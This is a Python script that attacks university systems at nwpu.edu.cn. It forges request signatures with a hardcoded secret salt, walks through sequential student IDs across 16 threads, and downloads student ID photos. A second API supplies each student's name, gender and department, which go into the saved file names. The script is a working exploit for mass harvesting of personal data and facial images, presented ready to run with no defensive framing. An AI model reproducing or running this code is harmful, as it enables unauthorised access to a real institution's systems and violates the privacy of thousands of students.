import requests
from datetime import datetime
from math import floor
import hashlib
import os
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, wait
import threading

# X-Id-Token can be obtained from the website: https://art-reservation.nwpu.edu.cn/h5/pages/apply/personSearch
X_ID_TOKEN = '<put-your-x-id-token-here>'

def make_secret(stuid: str, timestamp: int) -> str:
    sugar = 'Ht5fgWDNVjLA1wRbOJ4ZauS46LLqIpiYwPEYNUnVFg42B7CUvV1CC0OPbcaK3R8j'
    return hashlib.md5(f'{stuid}{timestamp}{sugar}'.encode('utf-8')).hexdigest()

def search_for_stuid(stuid: str, token: str = X_ID_TOKEN) -> dict[str, any]:
    url = 'https://art-reservation.nwpu.edu.cn/api/user/page'
    params = {
        'keyword': stuid,
        'pageIndex': 0,
        'pageSize': 1,
    }
    resp = requests.get(url, params=params, headers={
        'X-Id-Token': token,
    })
    if resp.status_code != 200:
        return None
    try:
        items = resp.json()['data']['items']
        if len(items) == 0:
            return None
        d = items[0]
        return {
            'id': d['uid'],
            'name': d['name'],
            'from': d['organizationName'],
            'is_male': d['genderCode'] == '1',
        }
    except:
        return None

def fetch_npu_profile(stuid: str) -> bytes:
    url = 'https://jwxt.nwpu.edu.cn/eams-file-server/image/student'
    timestamp = floor(datetime.now().timestamp() * 1000)
    params = {
        'code': stuid,
        'timeStamp': timestamp,
        'secretKey': make_secret(stuid, timestamp),
        'systemKey': '01',
    }
    resp = requests.get(url, params=params)
    if resp.status_code != 200:
        return None
    return resp.content

if __name__ == '__main__':
    dl_dir = 'saved'
    pull_range = (2021, 2023)

    if not os.path.exists(dl_dir):
        os.mkdir(dl_dir)

    fail_acc = 0
    fail_acc_threshold = 32
    fail_acc_lock = threading.Lock()

    def reset_fail_counter() -> None:
        global fail_acc, fail_acc_lock
        fail_acc_lock.acquire()
        fail_acc = 0
        fail_acc_lock.release()

    def mark_as(success: bool) -> None:
        global fail_acc, fail_acc_lock
        fail_acc_lock.acquire()
        if success:
            fail_acc = 0
        else:
            fail_acc += 1
        fail_acc_lock.release()

    def fail_acc_exceeded() -> bool:
        global fail_acc, fail_acc_lock, fail_acc_threshold
        fail_acc_lock.acquire()
        exceeded = fail_acc >= fail_acc_threshold
        fail_acc_lock.release()
        return exceeded

    def fetch_and_save(stuid: str) -> None:
        if data := fetch_npu_profile(stuid):
            profile_name = stuid
            if details := search_for_stuid(stuid):
                if details['id'] == stuid:
                    gender = '男' if details['is_male'] else '女'
                    org = details["from"].replace("/", ",")
                    profile_name = f'{profile_name}_{gender}_{details["name"]}_{org}'
            with open(f'{dl_dir}/{profile_name}.png', 'wb') as f:
                f.write(data)
            mark_as(True)
        else:
            mark_as(False)

    thread_pool = ThreadPoolExecutor(max_workers=16)
    for grade in tqdm(range(pull_range[0], pull_range[1] + 1)):
        reset_fail_counter()
        tasks = []
        for i in tqdm(range(0, 10000)):
            stuid = f'{grade:04d}30{i:04d}'
            tasks.append(thread_pool.submit(fetch_and_save, stuid))
            if should_break := fail_acc_exceeded():
                break
            if len(tasks) >= fail_acc_threshold * 2:
                wait(tasks)
                tasks.clear()
        wait(tasks)
